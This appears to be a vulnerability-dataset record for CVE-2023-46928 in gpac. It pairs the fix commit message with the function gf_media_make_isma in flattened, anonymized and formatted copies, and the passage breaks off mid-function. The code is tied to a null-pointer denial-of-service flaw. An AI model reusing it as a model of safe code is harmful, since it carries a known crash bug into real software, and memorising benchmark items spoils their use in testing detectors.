CVE-2023-46928,['CWE-Other'],CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H,1,gpac,null guard on gf_media_change_pl (fixes #2661),0753bf6d867343a80a044bf47a27d0b7accc8bf1,https://github.com/gpac/gpac/commit/0753bf6d867343a80a044bf47a27d0b7accc8bf1,src/media_tools/isom_tools.c,gf_media_make_isma,"GF_EXPORT
GF_Err gf_media_make_isma(GF_ISOFile *mp4file, Bool keepESIDs, Bool keepImage, Bool no_ocr)
{
u32 AudioTrack, VideoTrack, Tracks, i, mType, bifsT, odT, descIndex, VID, AID, bifsID, odID;
u32 bifs, w, h;
Bool is_image, image_track;
GF_ESD *a_esd, *v_esd, *_esd;
GF_ObjectDescriptor *od;
GF_ODUpdate *odU;
GF_ODCodec *codec;
GF_ISOSample *samp;
GF_BitStream *bs;
u8 audioPL, visualPL;
switch (gf_isom_get_mode(mp4file)) {
case GF_ISOM_OPEN_EDIT:
case GF_ISOM_OPEN_WRITE:
case GF_ISOM_WRITE_EDIT:
break;
default:
return GF_BAD_PARAM;
}
Tracks = gf_isom_get_track_count(mp4file);
AID = VID = 0;
is_image = 0;
for (i=0; i<Tracks; i++) {
GF_ESD *esd = gf_isom_get_esd(mp4file, i+1, 1);
gf_isom_remove_track_from_root_od(mp4file, i+1);
mType = gf_isom_get_media_type(mp4file, i+1);
switch (mType) {
case GF_ISOM_MEDIA_VISUAL:
case GF_ISOM_MEDIA_AUXV:
case GF_ISOM_MEDIA_PICT:
image_track = 0;
if (esd && esd->decoderConfig && ((esd->decoderConfig->objectTypeIndication==GF_CODECID_JPEG) || (esd->decoderConfig->objectTypeIndication==GF_CODECID_PNG)) )
image_track = 1;
if (keepImage || !image_track) {
if (VID) {
if (esd) gf_odf_desc_del((GF_Descriptor*)esd);
GF_LOG(GF_LOG_ERROR, GF_LOG_MEDIA, (""[ISMA convert] More than one video track found, cannot convert file - remove extra track(s)\n""));
return GF_NOT_SUPPORTED;
}
VID = gf_isom_get_track_id(mp4file, i+1);
is_image = image_track;
} else {
GF_LOG(GF_LOG_INFO, GF_LOG_MEDIA, (""[ISMA convert] Visual track ID %d: only one sample found, assuming image and removing track\n"", gf_isom_get_track_id(mp4file, i+1) ) );
gf_isom_remove_track(mp4file, i+1);
i -= 1;
Tracks = gf_isom_get_track_count(mp4file);
}
break;
case GF_ISOM_MEDIA_AUDIO:
if (AID) {
if (esd) gf_odf_desc_del((GF_Descriptor*)esd);
GF_LOG(GF_LOG_ERROR, GF_LOG_MEDIA, (""[ISMA convert] More than one audio track found, cannot convert file - remove extra track(s)\n"") );
return GF_NOT_SUPPORTED;
}
AID = gf_isom_get_track_id(mp4file, i+1);
break;
default:
if (mType==GF_ISOM_MEDIA_HINT) {
GF_LOG(GF_LOG_INFO, GF_LOG_MEDIA, (""[ISMA convert] Removing Hint track ID %d\n"", gf_isom_get_track_id(mp4file, i+1) ));
} else {
GF_LOG(GF_LOG_INFO, GF_LOG_MEDIA, (""[ISMA convert] Removing track ID %d\n"", gf_isom_get_track_id(mp4file, i+1) ));
}
gf_isom_remove_track(mp4file, i+1);
i -= 1;
Tracks = gf_isom_get_track_count(mp4file);
break;
}
if (esd) gf_odf_desc_del((GF_Descriptor*)esd);
}
if (!AID && !VID) return GF_OK;
visualPL = 0xFE;
audioPL = 0xFE;
od = (GF_ObjectDescriptor *) gf_isom_get_root_od(mp4file);
if (od && (od->tag==GF_ODF_IOD_TAG)) {
audioPL = ((GF_InitialObjectDescriptor*)od)->audio_profileAndLevel;
visualPL = ((GF_InitialObjectDescriptor*)od)->visual_profileAndLevel;
}
if (od) gf_odf_desc_del((GF_Descriptor *)od);
bifs = 0;
odU = (GF_ODUpdate *) gf_odf_com_new(GF_ODF_OD_UPDATE_TAG);
a_esd = v_esd = NULL;
gf_isom_set_root_od_id(mp4file, 1);
bifsID = 1;
odID = 2;
if (keepESIDs) {
bifsID = 1;
while ((bifsID==AID) || (bifsID==VID)) bifsID++;
odID = 2;
while ((odID==AID) || (odID==VID) || (odID==bifsID)) odID++;
}
VideoTrack = gf_isom_get_track_by_id(mp4file, VID);
AudioTrack = gf_isom_get_track_by_id(mp4file, AID);
w = h = 0;
if (VideoTrack) {
bifs = 1;
od = (GF_ObjectDescriptor *) gf_odf_desc_new(GF_ODF_OD_TAG);
od->objectDescriptorID = ISMA_VIDEO_OD_ID;
if (!keepESIDs && (VID != ISMA_VIDEO_ES_ID)) {
gf_isom_set_track_id(mp4file, VideoTrack, ISMA_VIDEO_ES_ID);
}
v_esd = gf_isom_get_esd(mp4file, VideoTrack, 1);
if (v_esd) {
v_esd->OCRESID = no_ocr ? 0 : bifsID;
gf_odf_desc_add_desc((GF_Descriptor *)od, (GF_Descriptor *)v_esd);
gf_list_add(odU->objectDescriptors, od);
gf_isom_get_track_layout_info(mp4file, VideoTrack, &w, &h, NULL, NULL, NULL);
if (!w || !h) {
gf_isom_get_visual_info(mp4file, VideoTrack, 1, &w, &h);
#ifndef GPAC_DISABLE_AV_PARSERS
if (v_esd->decoderConfig
&& (v_esd->decoderConfig->objectTypeIndication==GF_CODECID_MPEG4_PART2)
&& (v_esd->decoderConfig->streamType==GF_STREAM_VISUAL)
&& v_esd->decoderConfig->decoderSpecificInfo
&& v_esd->decoderConfig->decoderSpecificInfo->data
) {
GF_M4VDecSpecInfo dsi;
gf_m4v_get_config(v_esd->decoderConfig->decoderSpecificInfo->data, v_esd->decoderConfig->decoderSpecificInfo->dataLength, &dsi);
if (!is_image && (!w || !h)) {
w = dsi.width;
h = dsi.height;
gf_isom_set_visual_info(mp4file, VideoTrack, 1, w, h);
GF_LOG(GF_LOG_INFO, GF_LOG_MEDIA, (""[ISMA convert] Adjusting visual track size to %d x %d\n"", w, h));
}
if (dsi.par_num && dsi.par_den && (dsi.par_den!=dsi.par_num)) {
w *= dsi.par_num;
w /= dsi.par_den;
}
if (dsi.VideoPL) visualPL = dsi.VideoPL;
}
#endif
}
}
}
if (AudioTrack) {
od = (GF_ObjectDescriptor *) gf_odf_desc_new(GF_ODF_OD_TAG);
od->objectDescriptorID = ISMA_AUDIO_OD_ID;
if (!keepESIDs && (AID != ISMA_AUDIO_ES_ID)) {
gf_isom_set_track_id(mp4file, AudioTrack, ISMA_AUDIO_ES_ID);
}
a_esd = gf_isom_get_esd(mp4file, AudioTrack, 1);
if (a_esd) {
a_esd->OCRESID = no_ocr ? 0 : bifsID;
if (!keepESIDs) a_esd->ESID = ISMA_AUDIO_ES_ID;
gf_odf_desc_add_desc((GF_Descriptor *)od, (GF_Descriptor *)a_esd);
gf_list_add(odU->objectDescriptors, od);
if (!bifs) {
bifs = 3;
} else {
bifs = 2;
}
#ifndef GPAC_DISABLE_AV_PARSERS
if (a_esd->decoderConfig && (a_esd->decoderConfig->objectTypeIndication == GF_CODECID_AAC_MPEG4)
&& a_esd->decoderConfig->decoderSpecificInfo
&& a_esd->decoderConfig->decoderSpecificInfo->data
) {
GF_M4ADecSpecInfo cfg;
gf_m4a_get_config(a_esd->decoderConfig->decoderSpecificInfo->data, a_esd->decoderConfig->decoderSpecificInfo->dataLength, &cfg);
audioPL = cfg.audioPL;
}
#endif
}
}
if (v_esd) gf_isom_change_mpeg4_description(mp4file, VideoTrack, 1, v_esd);
if (a_esd) gf_isom_change_mpeg4_description(mp4file, AudioTrack, 1, a_esd);
if ((!a_esd && AudioTrack) || (!v_esd && VideoTrack)) return GF_OK;
codec = gf_odf_codec_new();
samp = gf_isom_sample_new();
gf_odf_codec_add_com(codec, (GF_ODCom *)odU);
gf_odf_codec_encode(codec, 1);
gf_odf_codec_get_au(codec, &samp->data, &samp->dataLength);
gf_odf_codec_del(codec);
samp->CTS_Offset = 0;
samp->DTS = 0;
samp->IsRAP = RAP;
odT = gf_isom_new_track(mp4file, odID, GF_ISOM_MEDIA_OD, gf_isom_get_timescale(mp4file));
if (!odT) return gf_isom_last_error(mp4file);
_esd = gf_odf_desc_esd_new(SLPredef_MP4);
if (!_esd) return GF_OUT_OF_MEM;
_esd->decoderConfig->bufferSizeDB = samp->dataLength;
_esd->decoderConfig->objectTypeIndication = GF_CODECID_OD_V1;
_esd->decoderConfig->streamType = GF_STREAM_OD;
_esd->ESID = odID;
_esd->OCRESID = no_ocr ? 0 : bifsID;
gf_isom_new_mpeg4_description(mp4file, odT, _esd, NULL, NULL, &descIndex);
gf_odf_desc_del((GF_Descriptor *)_esd);
gf_isom_add_sample(mp4file, odT, 1, samp);
gf_isom_sample_del(&samp);
gf_isom_set_track_interleaving_group(mp4file, odT, 1);
bifsT = gf_isom_new_track(mp4file, bifsID, GF_ISOM_MEDIA_SCENE, gf_isom_get_timescale(mp4file));
if (!bifsT) return gf_isom_last_error(mp4file);
_esd = gf_odf_desc_esd_new(SLPredef_MP4);
if (!_esd) return GF_OUT_OF_MEM;
_esd->decoderConfig->bufferSizeDB = 20;
_esd->decoderConfig->objectTypeIndication = GF_CODECID_BIFS_V2;
_esd->decoderConfig->streamType = GF_STREAM_SCENE;
_esd->ESID = bifsID;
_esd->OCRESID = 0;
bs = gf_bs_new(NULL, 0, GF_BITSTREAM_WRITE);
gf_bs_write_int(bs, 0, 17);
gf_bs_write_int(bs, 1, 1);
gf_bs_write_int(bs, 1, 1);
gf_bs_write_int(bs, 1, 1);
gf_bs_write_int(bs, w, 16);
gf_bs_write_int(bs, h, 16);
gf_bs_align(bs);
gf_bs_get_content(bs, &_esd->decoderConfig->decoderSpecificInfo->data, &_esd->decoderConfig->decoderSpecificInfo->dataLength);
gf_isom_new_mpeg4_description(mp4file, bifsT, _esd, NULL, NULL, &descIndex);
gf_odf_desc_del((GF_Descriptor *)_esd);
gf_bs_del(bs);
gf_isom_set_visual_info(mp4file, bifsT, descIndex, w, h);
samp = gf_isom_sample_new();
samp->CTS_Offset = 0;
samp->DTS = 0;
switch (bifs) {
case 1:
if (is_image) {
samp->data = (char *) ISMA_BIFS_IMAGE;
samp->dataLength = 10;
} else {
samp->data = (char *) ISMA_GF_BIFS_VIDEO;
samp->dataLength = 11;
}
break;
case 2:
if (is_image) {
samp->data = (char *) ISMA_BIFS_AI;
samp->dataLength = 15;
} else {
samp->data = (char *) ISMA_BIFS_AV;
samp->dataLength = 16;
}
break;
case 3:
samp->data = (char *) ISMA_BIFS_AUDIO;
samp->dataLength = 8;
break;
}
samp->IsRAP = RAP;
gf_isom_add_sample(mp4file, bifsT, 1, samp);
samp->data = NULL;
gf_isom_sample_del(&samp);
gf_isom_set_track_interleaving_group(mp4file, bifsT, 1);
gf_isom_set_track_enabled(mp4file, bifsT, GF_TRUE);
gf_isom_set_track_enabled(mp4file, odT, GF_TRUE);
gf_isom_add_track_to_root_od(mp4file, bifsT);
gf_isom_add_track_to_root_od(mp4file, odT);
gf_isom_set_pl_indication(mp4file, GF_ISOM_PL_SCENE, 1);
gf_isom_set_pl_indication(mp4file, GF_ISOM_PL_GRAPHICS, 1);
gf_isom_set_pl_indication(mp4file, GF_ISOM_PL_OD, 1);
gf_isom_set_pl_indication(mp4file, GF_ISOM_PL_AUDIO, audioPL);
gf_isom_set_pl_indication(mp4file, GF_ISOM_PL_VISUAL, (u8) (is_image ? 0xFE : visualPL));
gf_isom_set_brand_info(mp4file, GF_ISOM_BRAND_MP42, 1);
gf_isom_modify_alternate_brand(mp4file, GF_ISOM_BRAND_ISOM, GF_TRUE);
gf_isom_modify_alternate_brand(mp4file, GF_ISOM_BRAND_3GP5, GF_TRUE);
return GF_OK;
}","GF_EXPORT
VAR_0 gf_media_make_isma(GF_ISOFile *VAR_1, Bool VAR_2, Bool VAR_3, Bool VAR_4)
{
u32 VAR_5, VAR_6, VAR_7, VAR_8, VAR_9, VAR_10, VAR_11, VAR_12, VAR_13, VAR_14, VAR_15, VAR_16;
u32 VAR_17, VAR_18, VAR_19;
Bool VAR_20, VAR_21;
GF_ESD *VAR_22, *VAR_23, *VAR_24;
GF_ObjectDescriptor *VAR_25;
GF_ODUpdate *VAR_26;
GF_ODCodec *VAR_27;
GF_ISOSample *VAR_28;
GF_BitStream *VAR_29;
u8 VAR_30, VAR_31;
switch (gf_isom_get_mode(VAR_1)) {
case VAR_32:
case VAR_33:
case VAR_34:
break;
default:
return VAR_35;
}
VAR_7 = gf_isom_get_track_count(VAR_1);
VAR_14 = VAR_13 = 0;
VAR_20 = 0;
for (VAR_8=0; VAR_8<VAR_7; VAR_8++) {
GF_ESD *VAR_36 = gf_isom_get_esd(VAR_1, VAR_8+1, 1);
gf_isom_remove_track_from_root_od(VAR_1, VAR_8+1);
VAR_9 = gf_isom_get_media_type(VAR_1, VAR_8+1);
switch (VAR_9) {
case VAR_37:
case VAR_38:
case VAR_39:
VAR_21 = 0;
if (VAR_36 && VAR_36->decoderConfig && ((VAR_36->decoderConfig->objectTypeIndication==VAR_40) || (VAR_36->decoderConfig->objectTypeIndication==VAR_41)) )
VAR_21 = 1;
if (VAR_3 || !VAR_21) {
if (VAR_13) {
if (VAR_36) gf_odf_desc_del((GF_Descriptor*)VAR_36);
GF_LOG(VAR_42, VAR_43, (""[ISMA convert] More than one video track found, cannot convert file - remove extra track(s)\n""));
return VAR_44;
}
VAR_13 = gf_isom_get_track_id(VAR_1, VAR_8+1);
VAR_20 = VAR_21;
} else {
GF_LOG(VAR_45, VAR_43, (""[ISMA convert] Visual track ID %d: only one sample found, assuming image and removing track\n"", gf_isom_get_track_id(VAR_1, VAR_8+1) ) );
gf_isom_remove_track(VAR_1, VAR_8+1);
VAR_8 -= 1;
VAR_7 = gf_isom_get_track_count(VAR_1);
}
break;
case VAR_46:
if (VAR_14) {
if (VAR_36) gf_odf_desc_del((GF_Descriptor*)VAR_36);
GF_LOG(VAR_42, VAR_43, (""[ISMA convert] More than one audio track found, cannot convert file - remove extra track(s)\n"") );
return VAR_44;
}
VAR_14 = gf_isom_get_track_id(VAR_1, VAR_8+1);
break;
default:
if (VAR_9==VAR_47) {
GF_LOG(VAR_45, VAR_43, (""[ISMA convert] Removing Hint track ID %d\n"", gf_isom_get_track_id(VAR_1, VAR_8+1) ));
} else {
GF_LOG(VAR_45, VAR_43, (""[ISMA convert] Removing track ID %d\n"", gf_isom_get_track_id(VAR_1, VAR_8+1) ));
}
gf_isom_remove_track(VAR_1, VAR_8+1);
VAR_8 -= 1;
VAR_7 = gf_isom_get_track_count(VAR_1);
break;
}
if (VAR_36) gf_odf_desc_del((GF_Descriptor*)VAR_36);
}
if (!VAR_14 && !VAR_13) return VAR_48;
VAR_31 = 0xFE;
VAR_30 = 0xFE;
VAR_25 = (GF_ObjectDescriptor *) gf_isom_get_root_od(VAR_1);
if (VAR_25 && (VAR_25->tag==VAR_49)) {
VAR_30 = ((GF_InitialObjectDescriptor*)VAR_25)->audio_profileAndLevel;
VAR_31 = ((GF_InitialObjectDescriptor*)VAR_25)->visual_profileAndLevel;
}
if (VAR_25) gf_odf_desc_del((GF_Descriptor *)VAR_25);
VAR_17 = 0;
VAR_26 = (GF_ODUpdate *) gf_odf_com_new(VAR_50);
VAR_22 = VAR_23 = NULL;
gf_isom_set_root_od_id(VAR_1, 1);
VAR_15 = 1;
VAR_16 = 2;
if (VAR_2) {
VAR_15 = 1;
while ((VAR_15==VAR_14) || (VAR_15==VAR_13)) VAR_15++;
VAR_16 = 2;
while ((VAR_16==VAR_14) || (VAR_16==VAR_13) || (VAR_16==VAR_15)) VAR_16++;
}
VAR_6 = gf_isom_get_track_by_id(VAR_1, VAR_13);
VAR_5 = gf_isom_get_track_by_id(VAR_1, VAR_14);
VAR_18 = VAR_19 = 0;
if (VAR_6) {
VAR_17 = 1;
VAR_25 = (GF_ObjectDescriptor *) gf_odf_desc_new(VAR_51);
VAR_25->objectDescriptorID = VAR_52;
if (!VAR_2 && (VAR_13 != VAR_53)) {
gf_isom_set_track_id(VAR_1, VAR_6, VAR_53);
}
VAR_23 = gf_isom_get_esd(VAR_1, VAR_6, 1);
if (VAR_23) {
VAR_23->OCRESID = VAR_4 ? 0 : VAR_15;
gf_odf_desc_add_desc((GF_Descriptor *)VAR_25, (GF_Descriptor *)VAR_23);
gf_list_add(VAR_26->objectDescriptors, VAR_25);
gf_isom_get_track_layout_info(VAR_1, VAR_6, &VAR_18, &VAR_19, NULL, NULL, NULL);
if (!VAR_18 || !VAR_19) {
gf_isom_get_visual_info(VAR_1, VAR_6, 1, &VAR_18, &VAR_19);
#ifndef VAR_54
if (VAR_23->decoderConfig
&& (VAR_23->decoderConfig->objectTypeIndication==VAR_55)
&& (VAR_23->decoderConfig->streamType==VAR_56)
&& VAR_23->decoderConfig->decoderSpecificInfo
&& VAR_23->decoderConfig->decoderSpecificInfo->data
) {
GF_M4VDecSpecInfo VAR_57;
gf_m4v_get_config(VAR_23->decoderConfig->decoderSpecificInfo->data, VAR_23->decoderConfig->decoderSpecificInfo->dataLength, &VAR_57);
if (!VAR_20 && (!VAR_18 || !VAR_19)) {
VAR_18 = VAR_57.width;
VAR_19 = VAR_57.height;
gf_isom_set_visual_info(VAR_1, VAR_6, 1, VAR_18, VAR_19);
GF_LOG(VAR_45, VAR_43, (""[ISMA convert] Adjusting visual track size to %d x %d\n"", VAR_18, VAR_19));
}
if (VAR_57.par_num && VAR_57.par_den && (VAR_57.par_den!=VAR_57.par_num)) {
VAR_18 *= VAR_57.par_num;
VAR_18 /= VAR_57.par_den;
}
if (VAR_57.VideoPL) VAR_31 = VAR_57.VideoPL;
}
#endif
}
}
}
if (VAR_5) {
VAR_25 = (GF_ObjectDescriptor *) gf_odf_desc_new(VAR_51);
VAR_25->objectDescriptorID = VAR_58;
if (!VAR_2 && (VAR_14 != VAR_59)) {
gf_isom_set_track_id(VAR_1, VAR_5, VAR_59);
}
VAR_22 = gf_isom_get_esd(VAR_1, VAR_5, 1);
if (VAR_22) {
VAR_22->OCRESID = VAR_4 ? 0 : VAR_15;
if (!VAR_2) VAR_22->ESID = VAR_59;
gf_odf_desc_add_desc((GF_Descriptor *)VAR_25, (GF_Descriptor *)VAR_22);
gf_list_add(VAR_26->objectDescriptors, VAR_25);
if (!VAR_17) {
VAR_17 = 3;
} else {
VAR_17 = 2;
}
#ifndef VAR_54
if (VAR_22->decoderConfig && (VAR_22->decoderConfig->objectTypeIndication == VAR_60)
&& VAR_22->decoderConfig->decoderSpecificInfo
&& VAR_22->decoderConfig->decoderSpecificInfo->data
) {
GF_M4ADecSpecInfo VAR_61;
gf_m4a_get_config(VAR_22->decoderConfig->decoderSpecificInfo->data, VAR_22->decoderConfig->decoderSpecificInfo->dataLength, &VAR_61);
VAR_30 = VAR_61.audioPL;
}
#endif
}
}
if (VAR_23) gf_isom_change_mpeg4_description(VAR_1, VAR_6, 1, VAR_23);
if (VAR_22) gf_isom_change_mpeg4_description(VAR_1, VAR_5, 1, VAR_22);
if ((!VAR_22 && VAR_5) || (!VAR_23 && VAR_6)) return VAR_48;
VAR_27 = gf_odf_codec_new();
VAR_28 = gf_isom_sample_new();
gf_odf_codec_add_com(VAR_27, (GF_ODCom *)VAR_26);
gf_odf_codec_encode(VAR_27, 1);
gf_odf_codec_get_au(VAR_27, &VAR_28->data, &VAR_28->dataLength);
gf_odf_codec_del(VAR_27);
VAR_28->CTS_Offset = 0;
VAR_28->DTS = 0;
VAR_28->IsRAP = VAR_62;
VAR_11 = gf_isom_new_track(VAR_1, VAR_16, VAR_63, gf_isom_get_timescale(VAR_1));
if (!VAR_11) return gf_isom_last_error(VAR_1);
VAR_24 = gf_odf_desc_esd_new(VAR_64);
if (!VAR_24) return VAR_65;
VAR_24->decoderConfig->bufferSizeDB = VAR_28->dataLength;
VAR_24->decoderConfig->objectTypeIndication = VAR_66;
VAR_24->decoderConfig->streamType = VAR_67;
VAR_24->ESID = VAR_16;
VAR_24->OCRESID = VAR_4 ? 0 : VAR_15;
gf_isom_new_mpeg4_description(VAR_1, VAR_11, VAR_24, NULL, NULL, &VAR_12);
gf_odf_desc_del((GF_Descriptor *)VAR_24);
gf_isom_add_sample(VAR_1, VAR_11, 1, VAR_28);
gf_isom_sample_del(&VAR_28);
gf_isom_set_track_interleaving_group(VAR_1, VAR_11, 1);
VAR_10 = gf_isom_new_track(VAR_1, VAR_15, VAR_68, gf_isom_get_timescale(VAR_1));
if (!VAR_10) return gf_isom_last_error(VAR_1);
VAR_24 = gf_odf_desc_esd_new(VAR_64);
if (!VAR_24) return VAR_65;
VAR_24->decoderConfig->bufferSizeDB = 20;
VAR_24->decoderConfig->objectTypeIndication = VAR_69;
VAR_24->decoderConfig->streamType = VAR_70;
VAR_24->ESID = VAR_15;
VAR_24->OCRESID = 0;
VAR_29 = gf_bs_new(NULL, 0, VAR_71);
gf_bs_write_int(VAR_29, 0, 17);
gf_bs_write_int(VAR_29, 1, 1);
gf_bs_write_int(VAR_29, 1, 1);
gf_bs_write_int(VAR_29, 1, 1);
gf_bs_write_int(VAR_29, VAR_18, 16);
gf_bs_write_int(VAR_29, VAR_19, 16);
gf_bs_align(VAR_29);
gf_bs_get_content(VAR_29, &VAR_24->decoderConfig->decoderSpecificInfo->data, &VAR_24->decoderConfig->decoderSpecificInfo->dataLength);
gf_isom_new_mpeg4_description(VAR_1, VAR_10, VAR_24, NULL, NULL, &VAR_12);
gf_odf_desc_del((GF_Descriptor *)VAR_24);
gf_bs_del(VAR_29);
gf_isom_set_visual_info(VAR_1, VAR_10, VAR_12, VAR_18, VAR_19);
VAR_28 = gf_isom_sample_new();
VAR_28->CTS_Offset = 0;
VAR_28->DTS = 0;
switch (VAR_17) {
case 1:
if (VAR_20) {
VAR_28->data = (char *) VAR_72;
VAR_28->dataLength = 10;
} else {
VAR_28->data = (char *) VAR_73;
VAR_28->dataLength = 11;
}
break;
case 2:
if (VAR_20) {
VAR_28->data = (char *) VAR_74;
VAR_28->dataLength = 15;
} else {
VAR_28->data = (char *) VAR_75;
VAR_28->dataLength = 16;
}
break;
case 3:
VAR_28->data = (char *) VAR_76;
VAR_28->dataLength = 8;
break;
}
VAR_28->IsRAP = VAR_62;
gf_isom_add_sample(VAR_1, VAR_10, 1, VAR_28);
VAR_28->data = NULL;
gf_isom_sample_del(&VAR_28);
gf_isom_set_track_interleaving_group(VAR_1, VAR_10, 1);
gf_isom_set_track_enabled(VAR_1, VAR_10, VAR_77);
gf_isom_set_track_enabled(VAR_1, VAR_11, VAR_77);
gf_isom_add_track_to_root_od(VAR_1, VAR_10);
gf_isom_add_track_to_root_od(VAR_1, VAR_11);
gf_isom_set_pl_indication(VAR_1, VAR_78, 1);
gf_isom_set_pl_indication(VAR_1, VAR_79, 1);
gf_isom_set_pl_indication(VAR_1, VAR_80, 1);
gf_isom_set_pl_indication(VAR_1, VAR_81, VAR_30);
gf_isom_set_pl_indication(VAR_1, VAR_82, (u8) (VAR_20 ? 0xFE : VAR_31));
gf_isom_set_brand_info(VAR_1, VAR_83, 1);
gf_isom_modify_alternate_brand(VAR_1, VAR_84, VAR_77);
gf_isom_modify_alternate_brand(VAR_1, VAR_85, VAR_77);
return VAR_48;
}",,"GF_EXPORT
GF_Err gf_media_make_isma(GF_ISOFile *mp4file, Bool keepESIDs, Bool keepImage, Bool no_ocr)
{
	u32 AudioTrack, VideoTrack, Tracks, i, mType, bifsT, odT, descIndex, VID, AID, bifsID, odID;
	u32 bifs, w, h;
	Bool is_image, image_track;
	GF_ESD *a_esd, *v_esd, *_esd;
	GF_ObjectDescriptor *od;
	GF_ODUpdate *odU;
	GF_ODCodec *codec;
	GF_ISOSample *samp;
	GF_BitStream *bs;
	u8 audioPL, visualPL;

	switch (gf_isom_get_mode(mp4file)) {
	case GF_ISOM_OPEN_EDIT:
	case GF_ISOM_OPEN_WRITE:
	case GF_ISOM_WRITE_EDIT:
		break;
	default:
		return GF_BAD_PARAM;
	}


	Tracks = gf_isom_get_track_count(mp4file);
	AID = VID = 0;
	is_image = 0;

	//search for tracks
	for (i=0; i<Tracks; i++) {
		GF_ESD *esd = gf_isom_get_esd(mp4file, i+1, 1);
		//remove from IOD
		gf_isom_remove_track_from_root_od(mp4file, i+1);

		mType = gf_isom_get_media_type(mp4file, i+1);
		switch (mType) {
		case GF_ISOM_MEDIA_VISUAL:
        case GF_ISOM_MEDIA_AUXV:
        case GF_ISOM_MEDIA_PICT:
			image_track = 0;
			if (esd && esd->decoderConfig && ((esd->decoderConfig->objectTypeIndication==GF_CODECID_JPEG) || (esd->decoderConfig->objectTypeIndication==GF_CODECID_PNG)) )
				image_track = 1;

			/*remove image tracks if wanted*/
			if (keepImage || !image_track) {
				/*only ONE video stream possible with ISMA*/
				if (VID) {
					if (esd) gf_odf_desc_del((GF_Descriptor*)esd);
					GF_LOG(GF_LOG_ERROR, GF_LOG_MEDIA, (""[ISMA convert] More than one video track found, cannot convert file - remove extra track(s)\n""));
					return GF_NOT_SUPPORTED;
				}
				VID = gf_isom_get_track_id(mp4file, i+1);
				is_image = image_track;
			} else {
				GF_LOG(GF_LOG_INFO, GF_LOG_MEDIA, (""[ISMA convert] Visual track ID %d: only one sample found, assuming image and removing track\n"", gf_isom_get_track_id(mp4file, i+1) ) );
				gf_isom_remove_track(mp4file, i+1);
				i -= 1;
				Tracks = gf_isom_get_track_count(mp4file);
			}
			break;
		case GF_ISOM_MEDIA_AUDIO:
			if (AID) {
				if (esd) gf_odf_desc_del((GF_Descriptor*)esd);
				GF_LOG(GF_LOG_ERROR, GF_LOG_MEDIA, (""[ISMA convert] More than one audio track found, cannot convert file - remove extra track(s)\n"") );
				return GF_NOT_SUPPORTED;
			}
			AID = gf_isom_get_track_id(mp4file, i+1);
			break;
		/*clean file*/
		default:
			if (mType==GF_ISOM_MEDIA_HINT) {
				GF_LOG(GF_LOG_INFO, GF_LOG_MEDIA, (""[ISMA convert] Removing Hint track ID %d\n"", gf_isom_get_track_id(mp4file, i+1) ));
			} else {
				GF_LOG(GF_LOG_INFO, GF_LOG_MEDIA, (""[ISMA convert] Removing track ID %d\n"", gf_isom_get_track_id(mp4file, i+1) ));
			}
			gf_isom_remove_track(mp4file, i+1);
			i -= 1;
			Tracks = gf_isom_get_track_count(mp4file);
			break;
		}
		if (esd) gf_odf_desc_del((GF_Descriptor*)esd);
	}
	//no audio no video
	if (!AID && !VID) return GF_OK;

	/*reset all PLs*/
	visualPL = 0xFE;
	audioPL = 0xFE;

	od = (GF_ObjectDescriptor *) gf_isom_get_root_od(mp4file);
	if (od && (od->tag==GF_ODF_IOD_TAG)) {
		audioPL = ((GF_InitialObjectDescriptor*)od)->audio_profileAndLevel;
		visualPL = ((GF_InitialObjectDescriptor*)od)->visual_profileAndLevel;
	}
	if (od) gf_odf_desc_del((GF_Descriptor *)od);


	//create the OD AU
	bifs = 0;
	odU = (GF_ODUpdate *) gf_odf_com_new(GF_ODF_OD_UPDATE_TAG);

	a_esd = v_esd = NULL;

	gf_isom_set_root_od_id(mp4file, 1);

	bifsID = 1;
	odID = 2;
	if (keepESIDs) {
		bifsID = 1;
		while ((bifsID==AID) || (bifsID==VID)) bifsID++;
		odID = 2;
		while ((odID==AID) || (odID==VID) || (odID==bifsID)) odID++;

	}

	VideoTrack = gf_isom_get_track_by_id(mp4file, VID);
	AudioTrack = gf_isom_get_track_by_id(mp4file, AID);

	w = h = 0;
	if (VideoTrack) {
		bifs = 1;
		od = (GF_ObjectDescriptor *) gf_odf_desc_new(GF_ODF_OD_TAG);
		od->objectDescriptorID = ISMA_VIDEO_OD_ID;

		if (!keepESIDs && (VID != ISMA_VIDEO_ES_ID)) {
			gf_isom_set_track_id(mp4file, VideoTrack, ISMA_VIDEO_ES_ID);
		}

		v_esd = gf_isom_get_esd(mp4file, VideoTrack, 1);
		if (v_esd) {
			v_esd->OCRESID = no_ocr ? 0 : bifsID;

			gf_odf_desc_add_desc((GF_Descriptor *)od, (GF_Descriptor *)v_esd);
			gf_list_add(odU->objectDescriptors, od);

			gf_isom_get_track_layout_info(mp4file, VideoTrack, &w, &h, NULL, NULL, NULL);
			if (!w || !h) {
				gf_isom_get_visual_info(mp4file, VideoTrack, 1, &w, &h);
#ifndef GPAC_DISABLE_AV_PARSERS
				if (v_esd->decoderConfig
					&& (v_esd->decoderConfig->objectTypeIndication==GF_CODECID_MPEG4_PART2)
					&& (v_esd->decoderConfig->streamType==GF_STREAM_VISUAL)
					&& v_esd->decoderConfig->decoderSpecificInfo
					&& v_esd->decoderConfig->decoderSpecificInfo->data
				) {
					GF_M4VDecSpecInfo dsi;
					gf_m4v_get_config(v_esd->decoderConfig->decoderSpecificInfo->data, v_esd->decoderConfig->decoderSpecificInfo->dataLength, &dsi);
					if (!is_image && (!w || !h)) {
						w = dsi.width;
						h = dsi.height;
						gf_isom_set_visual_info(mp4file, VideoTrack, 1, w, h);
						GF_LOG(GF_LOG_INFO, GF_LOG_MEDIA, (""[ISMA convert] Adjusting visual track size to %d x %d\n"", w, h));
					}
					if (dsi.par_num && dsi.par_den && (dsi.par_den!=dsi.par_num)) {
						w *= dsi.par_num;
						w /= dsi.par_den;
					}
					if (dsi.VideoPL) visualPL = dsi.VideoPL;
				}
#endif
			}
		}
	}

	if (AudioTrack) {
		od = (GF_ObjectDescriptor *) gf_odf_desc_new(GF_ODF_OD_TAG);
		od->objectDescriptorID = ISMA_AUDIO_OD_ID;

		if (!keepESIDs && (AID != ISMA_AUDIO_ES_ID)) {
			gf_isom_set_track_id(mp4file, AudioTrack, ISMA_AUDIO_ES_ID);
		}

		a_esd = gf_isom_get_esd(mp4file, AudioTrack, 1);
		if (a_esd) {
			a_esd->OCRESID = no_ocr ? 0 : bifsID;

			if (!keepESIDs) a_esd->ESID = ISMA_AUDIO_ES_ID;
			gf_odf_desc_add_desc((GF_Descriptor *)od, (GF_Descriptor *)a_esd);
			gf_list_add(odU->objectDescriptors, od);
			if (!bifs) {
